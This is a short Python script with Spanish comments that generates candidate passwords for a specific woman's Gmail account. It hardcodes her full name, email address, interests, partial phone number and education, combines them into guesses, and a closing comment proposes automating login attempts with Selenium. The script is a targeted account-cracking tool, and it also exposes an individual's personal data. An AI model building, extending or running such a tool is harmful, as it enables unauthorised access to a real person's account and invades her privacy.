import itertools

# Información proporcionada
correo = "yariesquivels@gmail.com"
nombre_completo = "yaritza paola esquivel solorzano"
intereses = ["tatuajes", "pesquivels", "arte", "NAVI", "catlover", "Leia", "medellin", "pucca","5755","solorz","solorz5755"]
ultimos_digitos_telefono = "74"
educacion = "licenciatura en lenguas extranjeras"

# Función para generar posibles contraseñas
def generar_posibles_contrasenas(nombre, intereses, ultimos_digitos, educacion):
    posibles_contrasenas = []

    # Combinaciones de nombre y apellidos
    partes_nombre = nombre.split()
    for r in range(1, len(partes_nombre) + 1):
        for combo in itertools.combinations(partes_nombre, r):
            posibles_contrasenas.append(''.join(combo))
            posibles_contrasenas.append(''.join(combo).lower())
            posibles_contrasenas.append(''.join(combo).capitalize())

    # Añadir intereses
    for interes in intereses:
        posibles_contrasenas.append(interes)
        posibles_contrasenas.append(interes.lower())
        posibles_contrasenas.append(interes.capitalize())

    # Combinaciones de nombre e intereses
    for parte in partes_nombre:
        for interes in intereses:
            posibles_contrasenas.append(parte + interes)
            posibles_contrasenas.append(parte.lower() + interes.lower())
            posibles_contrasenas.append(parte.capitalize() + interes.capitalize())

    # Añadir últimos dígitos del teléfono
    posibles_contrasenas.append(ultimos_digitos)
    for parte in partes_nombre:
        posibles_contrasenas.append(parte + ultimos_digitos)
        posibles_contrasenas.append(parte.lower() + ultimos_digitos)
        posibles_contrasenas.append(parte.capitalize() + ultimos_digitos)

    # Añadir educación
    posibles_contrasenas.append(educacion)
    posibles_contrasenas.append(educacion.lower())
    posibles_contrasenas.append(educacion.capitalize())

    return posibles_contrasenas

# Generar posibles contraseñas
posibles_contrasenas = generar_posibles_contrasenas(nombre_completo, intereses, ultimos_digitos_telefono, educacion)

# Imprimir las posibles contraseñas generadas
for contrasena in posibles_contrasenas:
    print(contrasena)

# Aquí podrías añadir código para intentar cada una de estas contraseñas en la cuenta de Gmail
# Por ejemplo, usando Selenium para automatizar el proceso de inicio de sesión